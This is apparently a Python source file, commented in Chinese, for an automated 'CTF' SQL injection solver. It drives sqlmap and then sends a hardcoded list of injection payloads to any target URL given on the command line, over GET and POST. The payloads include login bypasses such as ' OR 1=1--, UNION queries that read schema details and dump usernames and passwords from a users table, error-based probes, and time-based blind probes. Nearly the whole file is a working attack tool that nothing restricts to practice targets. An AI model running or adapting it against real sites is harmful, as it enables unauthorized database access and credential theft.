#!/usr/bin/env python3
"""
最终版CTF解题脚本
用于解决SQL注入CTF挑战
"""

import asyncio
import sys
import json
import argparse
from pathlib import Path
from datetime import datetime

# 添加项目根目录到Python路径
sys.path.insert(0, str(Path(__file__).parent))

from src.utils.logger import setup_logger
from src.mcp_server.tools.sqlmap_wrapper import SQLMapWrapper
from src.mcp_server.tools.universal_password_injector import universal_password_injection_tool


class CTFSolver:
    """CTF挑战解题器"""
    
    def __init__(self, verbose=True):
        self.logger = setup_logger("ctf_solver", log_level="DEBUG" if verbose else "INFO")
        self.verbose = verbose
        self.sqlmap_wrapper = SQLMapWrapper()
        
    async def initialize(self):
        """初始化"""
        self.logger.info("初始化CTF挑战解题器...")
        
        # 测试SQLMap连接
        connected = await self.sqlmap_wrapper.test_connection()
        if not connected:
            self.logger.error("SQLMap连接测试失败")
            return False
        
        self.logger.info("✅ SQLMap连接成功")
        return True
    
    async def solve_sql_injection(self, target_url, request_file=None, username_param="username", password_param="password"):
        """
        解决SQL注入CTF挑战
        
        Args:
            target_url: 目标URL
            request_file: 请求文件路径（可选）
            username_param: 用户名参数名
            password_param: 密码参数名
        """
        print("\n" + "="*80)
        print("CTF SQL注入解题器")
        print("="*80)
        print(f"目标: {target_url}")
        print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*80)
        
        results = {
            "solver_version": "1.0.0",
            "start_time": datetime.now().isoformat(),
            "target": target_url,
            "challenge_type": "sql-injection",
            "flags_found": [],
            "vulnerabilities": [],
            "tools_used": ["sqlmap", "universal_password_injector"],
            "phases_completed": [],
            "success": False,
            "detailed_steps": []
        }
        
        try:
            # 阶段1: 检测漏洞
            print("\n🔍 阶段1: 检测SQL注入漏洞...")
            
            if request_file and Path(request_file).exists():
                self.logger.info(f"使用请求文件: {request_file}")
                scan_result = await self.sqlmap_wrapper.scan_with_request_file(
                    request_file,
                    level=2,  # 降低level，加快扫描速度
                    risk=2,   # 降低risk，减少危险操作
                    threads=5  # 减少线程数
                )
            else:
                self.logger.info(f"直接扫描URL: {target_url}")
                scan_result = await self.sqlmap_wrapper.scan(
                    target_url,
                    level=2,  # 降低level，加快扫描速度
                    risk=2,   # 降低risk，减少危险操作
                    threads=5  # 减少线程数
                )
            
            step1 = {
                "step": "vulnerability_detection",
                "result": {
                    "success": scan_result.get("success", False),
                    "vulnerabilities": scan_result.get("vulnerabilities", []),
                    "vulnerability_count": len(scan_result.get("vulnerabilities", []))
                }
            }
            
            results["detailed_steps"].append(step1)
            results["vulnerabilities"] = scan_result.get("vulnerabilities", [])
            
            if not scan_result.get("vulnerabilities"):
                print("❌ SQLMap未发现SQL注入漏洞，继续尝试手动payload...")
            else:
                print(f"✅ 发现 {len(scan_result['vulnerabilities'])} 个漏洞")
                results["phases_completed"].append("vulnerability_detection")
            
            # 阶段2: 自动利用（仅在发现漏洞时执行）
            if scan_result.get("vulnerabilities"):
                print("\n⚡ 阶段2: 自动利用漏洞...")
                exploit_result = await self.sqlmap_wrapper.auto_exploit(
                    target_url,
                    level=2,  # 降低level，加快利用速度
                    risk=2,   # 降低risk，减少危险操作
                    threads=5  # 减少线程数
                )
                
                step2 = {
                    "step": "auto_exploitation",
                    "result": exploit_result
                }
                
                results["detailed_steps"].append(step2)
                
                if exploit_result.get("success"):
                    results["phases_completed"].append("exploitation")
                    
                    # 检查是否找到flag
                    if exploit_result.get("flag"):
                        flag = exploit_result["flag"]
                        print(f"\n🎉🎉🎉 找到Flag: {flag} 🎉🎉🎉")
                        results["flags_found"].append(flag)
                        results["success"] = True
                    else:
                        # 检查数据中是否包含flag
                        print("🔍 检查数据中是否包含flag...")
                        for table_key, table_data in exploit_result.get("data", {}).items():
                            for record in table_data:
                                for key, value in record.items():
                                    if isinstance(value, str):
                                        import re
                                        flag_patterns = [
                                            r'flag\{[^}]+\}',
                                            r'FLAG\{[^}]+\}',
                                            r'ctf\{[^}]+\}',
                                            r'CTF\{[^}]+\}',
                                            r'[A-Za-z0-9]{32}',
                                            r'[A-Za-z0-9]{64}',
                                        ]
                                        for pattern in flag_patterns:
                                            match = re.search(pattern, value)
                                            if match:
                                                flag = match.group()
                                                print(f"\n🎉🎉🎉 在数据中找到Flag: {flag} 🎉🎉🎉")
                                                results["flags_found"].append(flag)
                                                results["success"] = True
                                                break
                                            
                                            if results["success"]:
                                                break
                                        
                                        if results["success"]:
                                            break
                                
                                if results["success"]:
                                    break
                            
                            if results["success"]:
                                break
                        
                        if not results["success"] and exploit_result.get("data"):
                            print("✅ 成功获取数据但未找到明确flag格式")
                            results["success"] = True  # 部分成功
            else:
                print("\n⏭️  跳过阶段2（未发现漏洞）")
            
            # 阶段3: 手动尝试常见payload
            if not results["success"]:
                print("\n🔧 阶段3: 尝试手动payload...")
                await self._try_manual_payloads(target_url, results, username_param, password_param)
            
            # 生成报告
            await self._generate_report(results)
            
            return results
            
        except Exception as e:
            self.logger.error(f"解题过程中出现错误: {e}")
            import traceback
            self.logger.error(traceback.format_exc())
            
            results["error"] = str(e)
            return results
        finally:
            results["end_time"] = datetime.now().isoformat()
    
    async def _try_manual_payloads(self, target_url, results, username_param, password_param):
        """尝试手动payload"""
        import requests
        import re
        
        # 首先尝试万能密码注入
        print("\n🔑 尝试万能密码注入...")
        universal_password_success = await self._try_universal_password_injection(
            target_url, results, username_param, password_param
        )
        
        if universal_password_success:
            return
        
        # 如果万能密码失败，尝试其他payload
        print("\n🔧 尝试其他SQL注入payload...")
        
        # 常见SQL注入payload
        payloads = [
            # 联合查询payload
            f"admin' UNION SELECT 1,2,3--",
            f"admin' UNION SELECT database(),user(),version()--",
            f"admin' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            f"admin' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
            f"admin' UNION SELECT 1,group_concat(username,':',password),3 FROM users--",
            
            # 布尔盲注payload
            f"admin' AND 1=1--",
            f"admin' AND 1=2--",
            
            # 报错注入payload
            f"admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            f"admin' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
            
            # 时间盲注payload
            f"admin' AND sleep(5)--",
            
            # 新增：更直接的payload
            f"' OR 1=1--",
            f"' OR '1'='1",
            f"admin' OR '1'='1",
            f"admin' OR 1=1--",
            f"' UNION SELECT null,flag,null FROM flag--",
            f"' UNION SELECT null,@@version,null--",
        ]
        
        print(f"尝试 {len(payloads)} 个手动payload...")
        
        # 存储有效的payload
        effective_payloads = []
        
        for i, payload in enumerate(payloads):
            try:
                # 构建请求 - 尝试GET和POST两种方法
                params = {username_param: payload, password_param: "test"}
                
                # 首先尝试GET
                response = requests.get(target_url, params=params, timeout=10)
                
                # 检查响应中是否包含flag
                flag_patterns = [
                    r'flag\{[^}]+\}',
                    r'FLAG\{[^}]+\}',
                    r'ctf\{[^}]+\}',
                    r'CTF\{[^}]+\}',
                    r'[A-Za-z0-9]{32}',  # 32位哈希
                    r'[A-Za-z0-9]{64}',  # 64位哈希
                ]
                
                for pattern in flag_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        flag = match.group()
                        print(f"\n🎉 使用payload {i+1} 找到Flag: {flag}")
                        results["flags_found"].append(flag)
                        results["success"] = True
                        results["phases_completed"].append("manual_exploitation")
                        return
                
                # 检查响应中是否有数据库信息
                db_keywords = ["mysql", "database", "sql", "syntax", "error", "warning", "select", "union", "from", "where"]
                if any(keyword in response.text.lower() for keyword in db_keywords):
                    print(f"  Payload {i+1}: 可能有效 (发现数据库关键词)")
                    effective_payloads.append((i, payload, "GET", response))
                
                # 检查响应长度变化（与正常响应比较）
                normal_response = requests.get(target_url, params={username_param: "test", password_param: "test"}, timeout=5)
                if abs(len(response.text) - len(normal_response.text)) > 50:
                    print(f"  Payload {i+1}: 响应长度变化 ({len(normal_response.text)} -> {len(response.text)})")
                    if (i, payload, "GET", response) not in effective_payloads:
                        effective_payloads.append((i, payload, "GET", response))
                
                # 尝试POST请求
                try:
                    post_response = requests.post(target_url, data=params, timeout=10)
                    
                    # 检查flag
                    for pattern in flag_patterns:
                        match = re.search(pattern, post_response.text)
                        if match:
                            flag = match.group()
                            print(f"\n🎉 使用POST payload {i+1} 找到Flag: {flag}")
                            results["flags_found"].append(flag)
                            results["success"] = True
                            results["phases_completed"].append("manual_exploitation")
                            return
                    
                    # 检查数据库关键词
                    if any(keyword in post_response.text.lower() for keyword in db_keywords):
                        print(f"  Payload {i+1} (POST): 可能有效 (发现数据库关键词)")
                        effective_payloads.append((i, payload, "POST", post_response))
                
                except Exception as post_error:
                    pass
                
                # 检查是否有明显的SQL错误信息
                error_patterns = [
                    r"SQL syntax.*MySQL",
                    r"Warning.*mysql",
                    r"MySQL server version",
                    r"unclosed quotation mark",
                    r"quoted string not properly terminated",
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"  Payload {i+1}: 发现SQL错误信息")
                        if (i, payload, "GET", response) not in effective_payloads:
                            effective_payloads.append((i, payload, "GET", response))
                        break
            
            except Exception as e:
                print(f"  Payload {i+1}: 错误 - {e}")
        
        # 如果有有效的payload，尝试进一步利用
        if effective_payloads and not results["success"]:
            print(f"\n🔍 发现 {len(effective_payloads)} 个可能有效的payload，尝试进一步利用...")
            await self._exploit_effective_payloads(target_url, results, effective_payloads, username_param, password_param)
    
    async def _exploit_effective_payloads(self, target_url, results, effective_payloads, username_param, password_param):
        """利用有效的payload进行进一步攻击"""
        import requests
        import re
        
        print("\n🔧 开始深度利用...")
        
        # 尝试提取数据库信息
        print("1. 尝试提取数据库信息...")
        
        # 数据库信息提取payload
        info_payloads = [
            f"' UNION SELECT null,database(),null--",
            f"' UNION SELECT null,user(),null--",
            f"' UNION SELECT null,version(),null--",
            f"' UNION SELECT null,@@version,null--",
            f"' UNION SELECT null,@@datadir,null--",
            f"' UNION SELECT null,@@basedir,null--",
        ]
        
        for i, payload in enumerate(info_payloads):
            try:
                params = {username_param: payload, password_param: "test"}
                
                # 尝试GET
                response = requests.get(target_url, params=params, timeout=10)
                
                # 检查响应中是否有数据库信息
                db_info_patterns = [
                    r"Database: ([^\s<]+)",
                    r"Current database: ([^\s<]+)",
                    r"Current user: ([^\s<]+)",
                    r"Version: ([^\s<]+)",
                    r"MySQL ([^\s<]+)",
                    r"MariaDB ([^\s<]+)",
                ]
                
                for pattern in db_info_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        info = match.group(1)
                        print(f"  ✅ 发现数据库信息: {info}")
                        results["database_info"] = results.get("database_info", {})
                        if "Database:" in pattern:
                            results["database_info"]["name"] = info
                        elif "user" in pattern.lower():
                            results["database_info"]["user"] = info
                        elif "version" in pattern.lower():
                            results["database_info"]["version"] = info
                
                # 检查是否有明显的数据库信息在响应中
                if any(word in response.text.lower() for word in ["database", "user", "version", "mysql", "mariadb"]):
                    # 提取可能的信息
                    lines = response.text.split('\n')
                    for line in lines:
                        if any(word in line.lower() for word in ["database", "user", "version"]):
                            print(f"  可能的信息: {line.strip()[:100]}")
                
            except Exception as e:
                pass
        
        # 2. 尝试提取表名
        print("\n2. 尝试提取表名...")
        table_payloads = [
            f"' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()--",
            f"' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--",
        ]
        
        for payload in table_payloads:
            try:
                params = {username_param: payload, password_param: "test"}
                response = requests.get(target_url, params=params, timeout=10)
                
                # 查找表名模式
                table_pattern = r"[a-zA-Z_][a-zA-Z0-9_]*"
                potential_tables = re.findall(table_pattern, response.text)
                
                # 过滤常见表名
                common_tables = ["users", "admin", "flag", "flags", "user", "admin_user", "ctf", "challenge"]
                found_tables = [t for t in potential_tables if t.lower() in common_tables or len(t) > 5]
                
                if found_tables:
                    print(f"  ✅ 可能发现表名: {', '.join(found_tables[:5])}")
                    results["tables_found"] = found_tables[:5]
                    break
                    
            except Exception as e:
                pass
        
        # 3. 尝试从常见表中提取数据
        print("\n3. 尝试从常见表中提取数据...")
        common_tables_to_check = ["flag", "flags", "ctf", "challenge", "secret", "key"]
        
        for table in common_tables_to_check:
            try:
                # 尝试提取列名
                column_payload = f"' UNION SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_name='{table}'--"
                params = {username_param: column_payload, password_param: "test"}
                response = requests.get(target_url, params=params, timeout=10)
                
                # 检查是否有列名
                column_pattern = r"[a-zA-Z_][a-zA-Z0-9_]*"
                potential_columns = re.findall(column_pattern, response.text)
                
                # 过滤常见列名
                common_columns = ["flag", "value", "key", "secret", "password", "hash"]
                found_columns = [c for c in potential_columns if c.lower() in common_columns]
                
                if found_columns:
                    print(f"  ✅ 在表 {table} 中发现列: {', '.join(found_columns)}")
                    
                    # 尝试提取数据
                    for column in found_columns:
                        data_payload = f"' UNION SELECT null,{column},null FROM {table}--"
                        params = {username_param: data_payload, password_param: "test"}
                        data_response = requests.get(target_url, params=params, timeout=10)
                        
                        # 检查flag
                        flag_patterns = [
                            r'flag\{[^}]+\}',
                            r'FLAG\{[^}]+\}',
                            r'ctf\{[^}]+\}',
                            r'CTF\{[^}]+\}',
                            r'[A-Za-z0-9]{32}',
                            r'[A-Za-z0-9]{64}',
                        ]
                        
                        for pattern in flag_patterns:
                            match = re.search(pattern, data_response.text)
                            if match:
                                flag = match.group()
                                print(f"\n🎉🎉🎉 找到Flag: {flag} 🎉🎉🎉")
                                results["flags_found"].append(flag)
                                results["success"] = True
                                results["phases_completed"].append("deep_exploitation")
                                return
                        
                        # 检查是否有任何数据
                        if len(data_response.text) < 5000:  # 不是错误页面
                            # 提取可能的数据
                            lines = data_response.text.split('\n')
                            for line in lines:
                                if any(word in line.lower() for word in ["flag", "ctf", "key", "secret"]):
                                    print(f"  可能的数据: {line.strip()[:100]}")
                                    # 再次检查flag模式
                                    for pattern in flag_patterns:
                                        match = re.search(pattern, line)
                                        if match:
                                            flag = match.group()
                                            print(f"\n🎉 在数据中找到Flag: {flag}")
                                            results["flags_found"].append(flag)
                                            results["success"] = True
                                            results["phases_completed"].append("deep_exploitation")
                                            return
                    
                    break  # 如果找到表，就停止检查其他表
            
            except Exception as e:
                pass
        
        # 4. 尝试盲注提取flag
        print("\n4. 尝试盲注提取flag...")
        
        # 首先检查是否有flag表
        flag_table_check = "' UNION SELECT null,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%flag%' LIMIT 1),null--"
        
        try:
            params = {username_param: flag_table_check, password_param: "test"}
            response = requests.get(target_url, params=params, timeout=10)
            
            # 检查响应中是否有flag表名
            if any(word in response.text.lower() for word in ["flag", "ctf"]):
                print("  ✅ 发现flag相关表")
                
                # 尝试直接提取flag
                direct_flag_payloads = [
                    f"' UNION SELECT null,flag,null FROM flag--",
                    f"' UNION SELECT null,value,null FROM flag--",
                    f"' UNION SELECT null,* FROM flag--",
                    f"' UNION SELECT null,(SELECT flag FROM flag LIMIT 1),null--",
                ]
                
                for payload in direct_flag_payloads:
                    try:
                        params = {username_param: payload, password_param: "test"}
                        response = requests.get(target_url, params=params, timeout=10)
                        
                        # 检查flag
                        flag_patterns = [
                            r'flag\{[^}]+\}',
                            r'FLAG\{[^}]+\}',
                            r'ctf\{[^}]+\}',
                            r'CTF\{[^}]+\}',
                        ]
                        
                        for pattern in flag_patterns:
                            match = re.search(pattern, response.text)
                            if match:
                                flag = match.group()
                                print(f"\n🎉 使用直接查询找到Flag: {flag}")
                                results["flags_found"].append(flag)
                                results["success"] = True
                                results["phases_completed"].append("direct_flag_extraction")
                                return
                    
                    except Exception as e:
                        pass
        
        except Exception as e:
            pass
        
        print("\n⚠️  深度利用完成，但未找到flag")
    
    async def _try_universal_password_injection(self, target_url, results, username_param, password_param):
        """尝试万能密码注入 - 使用MCP工具"""
        print("\n🔑 尝试万能密码注入（使用MCP工具）...")
        
        try:
            # 使用MCP工具进行万能密码注入测试
            tool_result = await universal_password_injection_tool(
                target_url=target_url,
                payload_type="all",
                method="both"
            )
            
            # 记录工具使用
            results["tools_used"] = list(set(results.get("tools_used", []) + ["universal_password_injector"]))
            
            # 检查是否找到flag
            if tool_result.get("flag_found"):
                flag = tool_result["flag"]
                print(f"\n🎉 使用MCP万能密码注入工具找到Flag: {flag}")
                results["flags_found"].append(flag)
                results["success"] = True
                results["phases_completed"].append("universal_password_injection")
                
                # 记录成功的payload
                if tool_result.get("successful_payloads"):
                    first_success = tool_result["successful_payloads"][0]
                    results["universal_password_used"] = {
                        "username": first_success["payload"].get("username", "未知"),
                        "password": first_success["payload"].get("password", "未知"),
                        "method": first_success.get("method", "未知")
                    }
                
                return True
            
            # 检查是否有成功的payload（即使没找到flag）
            elif tool_result.get("successful_payloads_count", 0) > 0:
                print(f"✅ MCP工具发现 {tool_result['successful_payloads_count']} 个有效的万能密码payload")
                
                # 记录成功的payload信息
                results["universal_password_results"] = {
                    "payloads_tested": tool_result.get("payloads_tested", 0),
                    "successful_payloads_count": tool_result.get("successful_payloads_count", 0),
                    "successful_payloads": tool_result.get("successful_payloads", [])[:3]  # 只记录前3个
                }
                
                # 虽然没有找到flag，但发现了有效的注入点
                # 可以尝试进一步利用这些成功的payload
                print("🔧 尝试进一步利用成功的payload...")
                
                # 如果有成功的payload，我们可以尝试使用它们进行进一步攻击
                successful_payloads = tool_result.get("successful_payloads", [])
                if successful_payloads:
                    # 使用第一个成功的payload进行进一步测试
                    first_payload = successful_payloads[0]
                    payload_data = first_payload.get("payload", {})
                    method = first_payload.get("method", "GET")
                    
                    print(f"  使用payload: {payload_data} ({method})")
                    
                    # 这里可以添加进一步的利用逻辑
                    # 例如：尝试提取数据库信息、表名等
                    
                    # 标记为部分成功
                    results["phases_completed"].append("universal_password_injection_detected")
                    return True  # 返回True表示发现了注入点
            
            else:
                print("❌ MCP万能密码注入工具未发现有效的注入点")
                return False
                
        except Exception as e:
            print(f"❌ MCP万能密码注入工具执行失败: {e}")
            import traceback
            self.logger.error(f"MCP工具错误: {traceback.format_exc()}")
            return False
    
    async def _generate_report(self, results):
        """生成解题报告"""
        self.logger.info("生成解题报告...")
        
        # 确保end_time存在
        if "end_time" not in results:
            results["end_time"] = datetime.now().isoformat()
        
        # 计算耗时
        if results.get("start_time") and results.get("end_time"):
            try:
                start = datetime.fromisoformat(results["start_time"])
                end = datetime.fromisoformat(results["end_time"])
                results["duration"] = str(end - start)
            except (ValueError, KeyError) as e:
                self.logger.warning(f"无法计算耗时: {e}")
                results["duration"] = "未知"
        
        # 创建报告目录
        reports_dir = Path("reports")
        reports_dir.mkdir(exist_ok=True)
        
        # 生成文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = results["target"].replace("://", "_").replace("/", "_").replace(":", "_")
        report_file = reports_dir / f"ctf_solve_{target_safe}_{timestamp}.json"
        
        # 保存JSON报告
        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            self.logger.info(f"报告已保存: {report_file}")
        except Exception as e:
            self.logger.error(f"保存报告失败: {e}")
            return None
        
        # 打印摘要
        self._print_summary(results)
        
        return str(report_file)
    
    def _print_summary(self, results):
        """打印解题摘要"""
        print("\n" + "="*80)
        print("CTF解题完成摘要")
        print("="*80)
        print(f"目标: {results['target']}")
        print(f"挑战类型: {results.get('challenge_type', 'unknown')}")
        
        if 'duration' in results:
            print(f"耗时: {results['duration']}")
        
        print(f"完成阶段: {', '.join(results.get('phases_completed', []))}")
        print(f"发现漏洞: {len(results.get('vulnerabilities', []))}")
        print(f"找到Flag: {len(results.get('flags_found', []))}")
        
        if results.get('flags_found'):
            print("\n🎉 发现的Flag:")
            for flag in results['flags_found']:
                print(f"  {flag}")
        
        print(f"\n成功: {'✅ 是' if results.get('success') else '❌ 否'}")
        
        # 打印漏洞详情
        if results.get('vulnerabilities'):
            print("\n漏洞详情:")
            for i, vuln in enumerate(results['vulnerabilities'], 1):
                print(f"  {i}. {vuln.get('type', '未知')} - {vuln.get('parameter', '未知参数')}")
        
        print("="*80)


async def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="CTF SQL注入解题脚本")
    parser.add_argument("target", help="目标URL")
    parser.add_argument("-r", "--request-file", help="请求文件路径（包含HTTP请求）")
    parser.add_argument("-u", "--username-param", default="username", 
                       help="用户名参数名（默认: username）")
    parser.add_argument("-p", "--password-param", default="password", 
                       help="密码参数名（默认: password）")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    
    args = parser.parse_args()
    
    # 创建解题器
    solver = CTFSolver(verbose=args.verbose)
    
    try:
        # 初始化
        print("初始化CTF解题器...")
        success = await solver.initialize()
        if not success:
            print("❌ 解题器初始化失败")
            return 1
        
        print("✅ 解题器初始化成功")
        
        # 解决挑战
        results = await solver.solve_sql_injection(
            target_url=args.target,
            request_file=args.request_file,
            username_param=args.username_param,
            password_param=args.password_param
        )
        
        # 根据结果返回退出码
        if results.get("success"):
            print("\n✅ 解题成功！")
            return 0
        else:
            print("\n⚠️  解题未完全成功")
            return 1
            
    except KeyboardInterrupt:
        print("\n\n解题被用户中断")
        return 130
    except Exception as e:
        print(f"\n❌ 解题失败: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)